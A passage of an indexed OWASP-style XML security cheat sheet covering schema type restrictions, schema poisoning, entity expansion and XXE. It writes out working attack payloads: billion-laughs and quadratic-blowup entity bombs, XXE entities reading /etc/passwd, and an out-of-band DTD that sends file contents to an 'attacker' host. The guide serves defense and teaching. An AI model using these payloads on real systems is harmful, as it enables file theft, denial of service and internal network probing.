numeric data types can include different ranges of numbers. They could include: negativeInteger : Only negative numbers nonNegativeInteger : Negative numbers and the zero value positiveInteger : Only positive numbers nonPositiveInteger : Positive numbers and the zero value The following sample document defines an id for a product, a price , and a quantity value that is under the control of an attacker: <buy> <id> 1 </id> <price> 10 </price> <quantity> 1 </quantity> </buy> To avoid repeating old errors, an XML schema may be defined to prevent processing the incorrect structure in cases where an attacker wants to introduce additional elements: <xs:schema xmlns:xs= \"http://www.w3.org/2001/XMLSchema\" > <xs:element name= \"buy\" > <xs:complexType> <xs:sequence> <xs:element name= \"id\" type= \"xs:integer\" /> <xs:element name= \"price\" type= \"xs:decimal\" /> <xs:element name= \"quantity\" type= \"xs:integer\" /> </xs:sequence> </xs:complexType> </xs:element> </xs:schema> Limiting that quantity to an integer data type will avoid any unexpected characters. Once the application receives the previous message, it may calculate the final price by doing price*quantity . However, since this data type may allow negative values, it might allow a negative result on the user's account if an attacker provides a negative number. What you probably want to see in here to avoid that logical vulnerability is positiveInteger instead of integer.","title":"Negative and Positive Restrictions"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#divide-by-zero","text":"Whenever using user controlled values as denominators in a division, developers should avoid allowing the number zero. In cases where the value zero is used for division in XSLT, the error FOAR0001 will occur. Other applications may throw other exceptions and the program may crash. There are specific data types for XML schemas that specifically avoid using the zero value. For example, in cases where negative values and zero are not considered valid, the schema could specify the data type positiveInteger for the element. <xs:element name= \"denominator\" > <xs:simpleType> <xs:restriction base= \"xs:positiveInteger\" /> </xs:simpleType> </xs:element> The element denominator is now restricted to positive integers. This means that only values greater than zero will be considered valid. If you see any other type of restriction being used, you may trigger an error if the denominator is zero.","title":"Divide by Zero"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#special-values-infinity-and-not-a-number-nan","text":"The data types float and double contain real numbers and some special values: -Infinity or -INF , NaN , and +Infinity or INF . These possibilities may be useful to express certain values, but they are sometimes misused. The problem is that they are commonly used to express only real numbers such as prices. This is a common error seen in other programming languages, not solely restricted to these technologies. Not considering the whole spectrum of possible values for a data type could make underlying applications fail. If the special values Infinity and NaN are not required and only real numbers are expected, the data type decimal is recommended: <xs:schema xmlns:xs= \"http://www.w3.org/2001/XMLSchema\" > <xs:element name= \"buy\" > <xs:complexType> <xs:sequence> <xs:element name= \"id\" type= \"xs:integer\" /> <xs:element name= \"price\" type= \"xs:decimal\" /> <xs:element name= \"quantity\" type= \"xs:positiveInteger\" /> </xs:sequence> </xs:complexType> </xs:element> </xs:schema> The price value will not trigger any errors when set at Infinity or NaN, because these values will not be valid. An attacker can exploit this issue if those values are allowed.","title":"Special Values: Infinity and Not a Number (NaN)"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#general-data-restrictions","text":"After selecting the appropriate data type, developers may apply additional restrictions. Sometimes only a certain subset of values within a data type will be considered valid:","title":"General Data Restrictions"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#prefixed-values","text":"Certain types of values should only be restricted to specific sets: traffic lights will have only three types of colors, only 12 months are available, and so on. It is possible that the schema has these restrictions in place for each element or attribute. This is the most perfect whitelist scenario for an application: only specific values will be accepted. Such a constraint is called enumeration in XML schema. The following example restricts the contents of the element month to 12 possible values: <xs:element name= \"month\" > <xs:simpleType> <xs:restriction base= \"xs:string\" > <xs:enumeration value= \"January\" /> <xs:enumeration value= \"February\" /> <xs:enumeration value= \"March\" /> <xs:enumeration value= \"April\" /> <xs:enumeration value= \"May\" /> <xs:enumeration value= \"June\" /> <xs:enumeration value= \"July\" /> <xs:enumeration value= \"August\" /> <xs:enumeration value= \"September\" /> <xs:enumeration value= \"October\" /> <xs:enumeration value= \"November\" /> <xs:enumeration value= \"December\" /> </xs:restriction> </xs:simpleType> </xs:element> By limiting the month element's value to any of the previous values, the application will not be manipulating random strings.","title":"Prefixed Values"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#ranges","text":"Software applications, databases, and programming languages normally store information within specific ranges. Whenever using an element or an attribute in locations where certain specific sizes matter (to avoid overflows or underflows), it would be logical to check whether the data length is considered valid. The following schema could constrain a name using a minimum and a maximum length to avoid unusual scenarios: <xs:element name= \"name\" > <xs:simpleType> <xs:restriction base= \"xs:string\" > <xs:minLength value= \"3\" /> <xs:maxLength value= \"256\" /> </xs:restriction> </xs:simpleType> </xs:element> In cases where the possible values are restricted to a certain specific length (let's say 8), this value can be specified as follows to be valid: <xs:element name= \"name\" > <xs:simpleType> <xs:restriction base= \"xs:string\" > <xs:length value= \"8\" /> </xs:restriction> </xs:simpleType> </xs:element>","title":"Ranges"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#patterns","text":"Certain elements or attributes may follow a specific syntax. You can add pattern restrictions when using XML schemas. When you want to ensure that the data complies with a specific pattern, you can create a specific definition for it. Social security numbers (SSN) may serve as a good example; they must use a specific set of characters, a specific length, and a specific pattern : <xs:element name= \"SSN\" > <xs:simpleType> <xs:restriction base= \"xs:token\" > <xs:pattern value= \"[0-9]{3}-[0-9]{2}-[0-9]{4}\" /> </xs:restriction> </xs:simpleType> </xs:element> Only numbers between 000-00-0000 and 999-99-9999 will be allowed as values for a SSN.","title":"Patterns"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#assertions","text":"Assertion components constrain the existence and values of related elements and attributes on XML schemas. An element or attribute will be considered valid with regard to an assertion only if the test evaluates to true without raising any error. The variable $value can be used to reference the contents of the value being analyzed. The Divide by Zero section above referenced the potential consequences of using data types containing the zero value for denominators, proposing a data type containing only positive values. An opposite example would consider valid the entire range of numbers except zero. To avoid disclosing potential errors, values could be checked using an assertion disallowing the number zero: <xs:element name= \"denominator\" > <xs:simpleType> <xs:restriction base= \"xs:integer\" > <xs:assertion test= \"$value != 0\" /> </xs:restriction> </xs:simpleType> </xs:element> The assertion guarantees that the denominator will not contain the value zero as a valid number and also allows negative numbers to be a valid denominator.","title":"Assertions"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#occurrences","text":"The consequences of not defining a maximum number of occurrences could be worse than coping with the consequences of what may happen when receiving extreme numbers of items to be processed. Two attributes specify minimum and maximum limits: minOccurs and maxOccurs . The default value for both the minOccurs and the maxOccurs attributes is 1 , but certain elements may require other values. For instance, if a value is optional, it could contain a minOccurs of 0, and if there is no limit on the maximum amount, it could contain a maxOccurs of unbounded , as in the following example: <xs:schema xmlns:xs= \"http://www.w3.org/2001/XMLSchema\" > <xs:element name= \"operation\" > <xs:complexType> <xs:sequence> <xs:element name= \"buy\" maxOccurs= \"unbounded\" > <xs:complexType> <xs:all> <xs:element name= \"id\" type= \"xs:integer\" /> <xs:element name= \"price\" type= \"xs:decimal\" /> <xs:element name= \"quantity\" type= \"xs:integer\" /> </xs:all> </xs:complexType> </xs:element> </xs:complexType> </xs:element> </xs:schema> The previous schema includes a root element named operation , which can contain an unlimited ( unbounded ) amount of buy elements. This is a common finding, since developers do not normally want to restrict maximum numbers of occurrences. Applications using limitless occurrences should test what happens when they receive an extremely large amount of elements to be processed. Since computational resources are limited, the consequences should be analyzed and eventually a maximum number ought to be used instead of an unbounded value.","title":"Occurrences"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#jumbo-payloads","text":"Sending an XML document of 1GB requires only a second of server processing and might not be worth consideration as an attack. Instead, an attacker would look for a way to minimize the CPU and traffic used to generate this type of attack, compared to the overall amount of server CPU or traffic used to handle the requests.","title":"Jumbo Payloads"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#traditional-jumbo-payloads","text":"There are two primary methods to make a document larger than normal: Depth attack: using a huge number of elements, element names, and/or element values. Width attack: using a huge number of attributes, attribute names, and/or attribute values. In most cases, the overall result will be a huge document. This is a short example of what this looks like: <SOAPENV:ENVELOPE XMLNS:SOAPENV= \"HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/\" XMLNS:EXT= \"HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL\" > <SOAPENV:HEADER LARGENAME1= \"LARGEVALUE\" LARGENAME2= \"LARGEVALUE2\" LARGENAME3= \"LARGEVALUE3\" \u2026 > ...","title":"Traditional Jumbo Payloads"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#small-jumbo-payloads","text":"The following example is a very small document, but the results of processing this could be similar to those of processing traditional jumbo payloads. The purpose of such a small payload is that it allows an attacker to send many documents fast enough to make the application consume most or all of the available resources: <?xml version=\"1.0\"?> <!DOCTYPE root [ <!ENTITY file SYSTEM \"http://attacker/huge.xml\" > ]> <root> &file; </root>","title":"\"Small\" Jumbo Payloads"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#schema-poisoning","text":"When an attacker is capable of introducing modifications to a schema, there could be multiple high-risk consequences. In particular, the effect of these consequences will be more dangerous if the schemas are using DTD (e.g., file retrieval, denial of service). An attacker could exploit this type of vulnerability in numerous scenarios, always depending on the location of the schema.","title":"Schema Poisoning"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#local-schema-poisoning","text":"Local schema poisoning happens when schemas are available in the same host, whether or not the schemas are embedded in the same XML document .","title":"Local Schema Poisoning"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#embedded-schema","text":"The most trivial type of schema poisoning takes place when the schema is defined within the same XML document. Consider the following, unknowingly vulnerable example provided by the W3C : <?xml version=\"1.0\"?> <!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]> <note> <to> Tove </to> <from> Jani </from> <heading> Reminder </heading> <body> Don't forget me this weekend </body> </note> All restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. This type of schema only serves as a suggestion for sending a document, but it must contains a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded XML schemas can also assist in port scans of internal hosts or brute force attacks.","title":"Embedded Schema"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#incorrect-permissions","text":"You can often circumvent the risk of using remotely tampered versions by processing a local schema. <!DOCTYPE note SYSTEM \"note.dtd\"> <note> <to> Tove </to> <from> Jani </from> <heading> Reminder </heading> <body> Don't forget me this weekend </body> </note> However, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions. The following line exemplifies a schema using permissions that allow any user to make modifications: -rw-rw-rw- 1 user staff 743 Jan 15 12:32 note.dtd The permissions set on name.dtd allow any user on the system to make modifications. This vulnerability is clearly not related to the structure of an XML or a schema, but since these documents are commonly stored in the filesystem, it is worth mentioning that an attacker could exploit this type of problem.","title":"Incorrect Permissions"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#remote-schema-poisoning","text":"Schemas defined by external organizations are normally referenced remotely. If capable of diverting or accessing the network's traffic, an attacker could cause a victim to fetch a distinct type of content rather than the one originally intended.","title":"Remote Schema Poisoning"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#man-in-the-middle-mitm-attack","text":"When documents reference remote schemas using the unencrypted Hypertext Transfer Protocol (HTTP), the communication is performed in plain text and an attacker could easily tamper with traffic. When XML documents reference remote schemas using an HTTP connection, the connection could be sniffed and modified before reaching the end user: <!DOCTYPE note SYSTEM \"http://example.com/note.dtd\"> <note> <to> Tove </to> <from> Jani </from> <heading> Reminder </heading> <body> Don't forget me this weekend </body> </note> The remote file note.dtd could be susceptible to tampering when transmitted using the unencrypted HTTP protocol. One tool available to facilitate this type of attack is mitmproxy .","title":"Man-in-the-Middle (MitM) Attack"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#dns-cache-poisoning","text":"Remote schema poisoning may also be possible even when using encrypted protocols like Hypertext Transfer Protocol Secure (HTTPS). When software performs reverse Domain Name System (DNS) resolution on an IP address to obtain the hostname, it may not properly ensure that the IP address is truly associated with the hostname. In this case, the software enables an attacker to redirect content to their own Internet Protocol (IP) addresses. The previous example referenced the host example.com using an unencrypted protocol. When switching to HTTPS, the location of the remote schema will look like https://example/note.dtd . In a normal scenario, the IP of example.com resolves to 1.1.1.1 : $ host example.com example.com has address 1 .1.1.1 If an attacker compromises the DNS being used, the previous hostname could now point to a new, different IP controlled by the attacker 2.2.2.2 : $ host example.com example.com has address 2 .2.2.2 When accessing the remote file, the victim may be actually retrieving the contents of a location controlled by an attacker.","title":"DNS-Cache Poisoning"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#evil-employee-attack","text":"When third parties host and define schemas, the contents are not under the control of the schemas' users. Any modifications introduced by a malicious employee-or an external attacker in control of these files-could impact all users processing the schemas. Subsequently, attackers could affect the confidentiality, integrity, or availability of other services (especially if the schema in use is DTD ).","title":"Evil Employee Attack"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#xml-entity-expansion","text":"If the parser uses a DTD , an attacker might inject data that may adversely affect the XML parser during document processing. These adverse effects could include the parser crashing or accessing local files.","title":"XML Entity Expansion"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#sample-vulnerable-java-implementations","text":"Using the DTD capabilities of referencing local or remote files it is possible to affect the confidentiality. In addition, it is also possible to affect the availability of the resources if no proper restrictions have been set for the entities expansion. Consider the following example code of an XXE. Sample XML : <!DOCTYPE contacts SYSTEM \"contacts.dtd\"> <contacts> <contact> <firstname> John </firstname> <lastname> &xxe; </lastname> </contact> </contacts> Sample DTD : <!ELEMENT contacts (contact*)> <!ELEMENT contact (firstname,lastname)> <!ELEMENT firstname (#PCDATA)> <!ELEMENT lastname ANY> <!ENTITY xxe SYSTEM \"/etc/passwd\">","title":"Sample Vulnerable Java Implementations"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#xxe-using-dom","text":"import java.io.IOException ; import javax.xml.parsers.DocumentBuilder ; import javax.xml.parsers.DocumentBuilderFactory ; import javax.xml.parsers.ParserConfigurationException ; import org.xml.sax.InputSource ; import org.w3c.dom.Document ; import org.w3c.dom.Element ; import org.w3c.dom.Node ; import org.w3c.dom.NodeList ; public class parseDocument { public static void main ( String [] args ) { try { DocumentBuilderFactory factory = DocumentBuilderFactory . newInstance (); DocumentBuilder builder = factory . newDocumentBuilder (); Document doc = builder . parse ( new InputSource ( \"contacts.xml\" )); NodeList nodeList = doc . getElementsByTagName ( \"contact\" ); for ( int s = 0 ; s < nodeList . getLength (); s ++ ) { Node firstNode = nodeList . item ( s ); if ( firstNode . getNodeType () == Node . ELEMENT_NODE ) { Element firstElement = ( Element ) firstNode ; NodeList firstNameElementList = firstElement . getElementsByTagName ( \"firstname\" ); Element firstNameElement = ( Element ) firstNameElementList . item ( 0 ); NodeList firstName = firstNameElement . getChildNodes (); System . out . println ( \"First Name: \" + (( Node ) firstName . item ( 0 )). getNodeValue ()); NodeList lastNameElementList = firstElement . getElementsByTagName ( \"lastname\" ); Element lastNameElement = ( Element ) lastNameElementList . item ( 0 ); NodeList lastName = lastNameElement . getChildNodes (); System . out . println ( \"Last Name: \" + (( Node ) lastName . item ( 0 )). getNodeValue ()); } } } catch ( Exception e ) { e . printStackTrace (); } } } The previous code produces the following output: $ javac parseDocument.java ; java parseDocument First Name: John Last Name: ### User Database ... nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh","title":"XXE using DOM"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#xxe-using-dom4j","text":"import org.dom4j.Document ; import org.dom4j.DocumentException ; import org.dom4j.io.SAXReader ; import org.dom4j.io.OutputFormat ; import org.dom4j.io.XMLWriter ; public class test1 { public static void main ( String [] args ) { Document document = null ; try { SAXReader reader = new SAXReader (); document = reader . read ( \"contacts.xml\" ); } catch ( Exception e ) { e . printStackTrace (); } OutputFormat format = OutputFormat . createPrettyPrint (); try { XMLWriter writer = new XMLWriter ( System . out , format ); writer . write ( document ); } catch ( Exception e ) { e . printStackTrace (); } } } The previous code produces the following output: $ java test1 <?xml version = \"1.0\" encoding = \"UTF-8\" ?> <!DOCTYPE contacts SYSTEM \"contacts.dtd\" > <contacts> <contact> <firstname>John</firstname> <lastname>### User Database ... nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh","title":"XXE using DOM4J"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#xxe-using-sax","text":"import java.io.IOException ; import javax.xml.parsers.SAXParser ; import javax.xml.parsers.SAXParserFactory ; import org.xml.sax.SAXException ; import org.xml.sax.helpers.DefaultHandler ; public class parseDocument extends DefaultHandler { public static void main ( String [] args ) { new parseDocument (); } public parseDocument () { try { SAXParserFactory factory = SAXParserFactory . newInstance (); SAXParser parser = factory . newSAXParser (); parser . parse ( \"contacts.xml\" , this ); } catch ( Exception e ) { e . printStackTrace (); } } @Override public void characters ( char [] ac , int i , int j ) throws SAXException { String tmpValue = new String ( ac , i , j ); System . out . println ( tmpValue ); } } The previous code produces the following output: $ java parseDocument John #### User Database ... nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh","title":"XXE using SAX"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#xxe-using-stax","text":"import javax.xml.parsers.SAXParserFactory ; import javax.xml.stream.XMLStreamReader ; import javax.xml.stream.XMLInputFactory ; import java.io.File ; import java.io.FileReader ; import java.io.FileInputStream ; public class parseDocument { public static void main ( String [] args ) { try { XMLInputFactory xmlif = XMLInputFactory . newInstance (); FileReader fr = new FileReader ( \"contacts.xml\" ); File file = new File ( \"contacts.xml\" ); XMLStreamReader xmlfer = xmlif . createXMLStreamReader ( \"contacts.xml\" , new FileInputStream ( file )); int eventType = xmlfer . getEventType (); while ( xmlfer . hasNext ()) { eventType = xmlfer . next (); if ( xmlfer . hasText ()){ System . out . print ( xmlfer . getText ()); } } fr . close (); } catch ( Exception e ) { e . printStackTrace (); } } } The previous code produces the following output: $ java parseDocument <!DOCTYPE contacts SYSTEM \"contacts.dtd\" >John### User Database ... nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false root:*:0:0:System Administrator:/var/root:/bin/sh","title":"XXE using StAX"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#recursive-entity-reference","text":"When the definition of an element A is another element B , and that element B is defined as element A , that schema describes a circular reference between elements: <!DOCTYPE A [ <!ELEMENT A ANY> <!ENTITY A \"<A> &B; </A> \"> <!ENTITY B \"&A;\"> ]> <A> &A; </A>","title":"Recursive Entity Reference"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#quadratic-blowup","text":"Instead of defining multiple small, deeply nested entities, the attacker in this scenario defines one very large entity and refers to it as many times as possible, resulting in a quadratic expansion (O(n2)) . The result of the following attack will be 100,000 x 100,000 characters in memory. <!DOCTYPE root [ <!ELEMENT root ANY> <!ENTITY A \"AAAAA...(a 100.000 A's)...AAAAA\"> ]> <root> &A;&A;&A;&A; ...(a 100.000 &A; 's)... &A;&A;&A;&A;&A; </root>","title":"Quadratic Blowup"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#billion-laughs","text":"When an XML parser tries to resolve the external entities included within the following code, it will cause the application to start consuming all of the available memory until the process crashes. This is an example XML document with an embedded DTD schema including the attack: <!DOCTYPE root [ <!ELEMENT root ANY> <!ENTITY LOL \"LOL\"> <!ENTITY LOL1 \"&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;\"> <!ENTITY LOL2 \"&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;\"> <!ENTITY LOL3 \"&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;\"> <!ENTITY LOL4 \"&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;\"> <!ENTITY LOL5 \"&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;\"> <!ENTITY LOL6 \"&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;\"> <!ENTITY LOL7 \"&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;\"> <!ENTITY LOL8 \"&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;\"> <!ENTITY LOL9 \"&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;\"> ]> <root> &LOL9; </root> The entity LOL9 will be resolved as the 10 entities defined in LOL8 ; then each of these entities will be resolved in LOL7 and so on. Finally, the CPU and/or memory will be affected by parsing the 3 x 10^9 (3,000,000,000) entities defined in this schema, which could make the parser crash. The Simple Object Access Protocol ( SOAP ) specification forbids DTD s completely. This means that a SOAP processor can reject any SOAP message that contains a DTD . Despite this specification, certain SOAP implementations did parse DTD schemas within SOAP messages. The following example illustrates a case where the parser is not following the specification, enabling a reference to a DTD in a SOAP message: <?XML VERSION=\"1.0\" ENCODING=\"UTF-8\"?> <!DOCTYPE SOAP-ENV:ENVELOPE [ <!ELEMENT SOAP-ENV:ENVELOPE ANY> <!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED> <!ENTITY LOL \"LOL\"> <!ENTITY LOL1 \"&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;\"> <!ENTITY LOL2 \"&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;\"> <!ENTITY LOL3 \"&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;\"> <!ENTITY LOL4 \"&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;\"> <!ENTITY LOL5 \"&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;\"> <!ENTITY LOL6 \"&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;\"> <!ENTITY LOL7 \"&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;\"> <!ENTITY LOL8 \"&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;\"> <!ENTITY LOL9 \"&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;\"> ]> <SOAP:ENVELOPE ENTITYREFERENCE= \"&LOL9;\" XMLNS:SOAP= \"HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/\" > <SOAP:BODY> <KEYWORD XMLNS= \"URN:PARASOFT:WS:STORE\" > FOO </KEYWORD> </SOAP:BODY> </SOAP:ENVELOPE>","title":"Billion Laughs"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#reflected-file-retrieval","text":"Consider the following example code of an XXE: <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE root [ <!ELEMENT includeme ANY> <!ENTITY xxe SYSTEM \"/etc/passwd\"> ]> <root> &xxe; </root> The previous XML defines an entity named xxe , which is in fact the contents of /etc/passwd , which will be expanded within the includeme tag. If the parser allows references to external entities, it might include the contents of that file in the XML response or in the error output.","title":"Reflected File Retrieval"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#server-side-request-forgery","text":"Server Side Request Forgery (SSRF) happens when the server receives a malicious XML schema, which makes the server retrieve remote resources such as a file, a file via HTTP/HTTPS/FTP, etc. SSRF has been used to retrieve remote files, to prove a XXE when you cannot reflect back the file or perform port scanning, or perform brute force attacks on internal networks.","title":"Server Side Request Forgery"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#external-dns-resolution","text":"Sometimes is possible to induce the application to perform server-side DNS lookups of arbitrary domain names. This is one of the simplest forms of SSRF, but requires the attacker to analyze the DNS traffic. Burp has a plugin that checks for this attack. <!DOCTYPE m PUBLIC \"-//B/A/EN\" \"http://checkforthisspecificdomain.example.com\">","title":"External DNS Resolution"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#external-connection","text":"Whenever there is an XXE and you cannot retrieve a file, you can test if you would be able to establish remote connections: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE root [ <!ENTITY % xxe SYSTEM \"http://attacker/evil.dtd\"> %xxe; ]>","title":"External Connection"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#file-retrieval-with-parameter-entities","text":"Parameter entities allows for the retrieval of content using URL references. Consider the following malicious XML document: <?xml version=\"1.0\" encoding=\"utf-8\"?> <!DOCTYPE root [ <!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % dtd SYSTEM \"http://attacker/evil.dtd\"> %dtd; ]> <root> &send; </root> Here the DTD defines two external parameter entities: file loads a local file, and dtd which loads a remote DTD . The remote DTD should contain something like this: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!ENTITY % all \"<!ENTITY send SYSTEM 'http://example.com/?%file;'> \"> %all; The second DTD causes the system to send the contents of the file back to the attacker's server as a parameter of the URL.","title":"File Retrieval with Parameter Entities"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#port-scanning","text":"The amount and type of information will depend on the type of implementation. Responses can be classified as follows, ranking from easy to complex: 1) Complete Disclosure : The simplest and most unusual scenario, with complete disclosure you can clearly see what's going on by receiving the complete responses from the server being queried. You have an exact representation of what happened when connecting to the remote host. 2) Error-based : If you are unable to see the response from the remote server, you may be able to use the error response. Consider a web service leaking details on what went wrong in the SOAP Fault element when trying to establish a connection: java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459) at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674) 3) Timeout-based : Timeouts could occur when connecting to open or closed ports depending on the schema and the underlying implementation. If the timeouts occur while you are trying to connect to a closed port (which may take one minute), the time of response when connected to a valid port will be very quick (one second, for example). The differences between open and closed ports becomes quite clear. 4) Time-based : Sometimes differences between closed and open ports are very subtle. The only way to know the status of a port with certainty would be to take multiple measurements of the time required to reach each host; then analyze the average time for each port to determinate the status of each port. This type of attack will be difficult to accomplish when performed in higher latency networks.","title":"Port Scanning"},{"location":"cheatsheets/XML_Security_Cheat_Sheet.html#brute-forcing","text":"Once an attacker confirms that it is possible to perform a port scan, performing a brute force attack is a matter of embedding the username and password as part of the URI scheme (http, ftp, etc). For example the following : <!DOCTYPE root [ <!ENTITY user SYSTEM \"http://username:password@example.com:8080\"> ]> <root> &user; </root>","title":"Brute Forcing"}]}